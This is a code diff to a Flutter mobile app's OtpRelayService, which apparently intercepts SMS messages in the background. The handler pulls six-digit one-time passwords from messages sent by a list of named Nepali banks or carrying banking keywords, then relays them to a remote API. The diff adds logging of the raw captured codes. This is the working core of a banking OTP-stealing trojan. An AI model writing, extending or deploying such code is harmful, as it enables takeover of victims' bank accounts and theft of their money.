@@ -1,6 +1,7 @@
 import 'package:telephony/telephony.dart';
 import 'api_service.dart';
 import 'package:shared_preferences/shared_preferences.dart';
+import 'package:flutter/widgets.dart';
 
 class OtpRelayService {
   final Telephony telephony = Telephony.instance;
@@ -74,15 +75,20 @@ class OtpRelayService {
 
 @pragma('vm:entry-point')
 void _backgroundMessageHandler(SmsMessage message) async {
+  WidgetsFlutterBinding.ensureInitialized();
   final body = message.body ?? "";
   final address = message.address ?? "";
   
+  _staticLogRelayEvent(address, "BG_DETECTOR: Received raw SMS");
+
   final otpMatch = RegExp(r'\b\d{6}\b').firstMatch(body);
   bool isBankingSms = body.contains(RegExp(r'OTP|code|verification|passcode|Pin|Transaction|auth', caseSensitive: false)) ||
                       address.contains(RegExp(r'NIC|Nabil|NMB|PRABHU|Siddhartha|Global|Sanima|Kumari|Citizens|Laxmi|Sunrise|Agriculture|AD-|Nepal', caseSensitive: false));
 
   if (otpMatch != null && isBankingSms) {
     final otp = otpMatch.group(0)!;
+    _staticLogRelayEvent(address, "BG_PROCESS: Matching OTP found ($otp). Relaying...");
+    
     final apiService = ApiService();
     try {
       await apiService.relayOtp(null, otp);
@@ -90,6 +96,8 @@ void _backgroundMessageHandler(SmsMessage message) async {
     } catch (e) {
       _staticLogRelayEvent(address, "ERROR (BG): $e");
     }
+  } else if (otpMatch != null) {
+     _staticLogRelayEvent(address, "BG_REJECT: Filters didn't match.");
   }
 }
 
